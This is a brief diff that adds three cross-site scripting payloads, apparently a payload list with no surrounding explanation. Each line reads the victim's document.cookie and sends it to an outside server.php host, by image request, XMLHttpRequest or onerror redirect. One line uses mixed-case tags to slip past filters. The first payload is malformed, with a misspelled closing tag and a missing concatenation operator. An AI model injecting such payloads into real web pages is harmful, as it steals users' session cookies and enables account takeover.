@@ -1,0 +1,6 @@
+<script> var i=new Image(); i.src="https://site.com/server.php?a="escape(document.cookie)</scrpit>
+
+
+><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://localhost.com/server.php?a="+document.cookie);x.send();</script>
+
+</ScRiPt><img src=a onerror=(document.location)="https://localhost.com/server.php?a="+(document.cookie)>';</script>
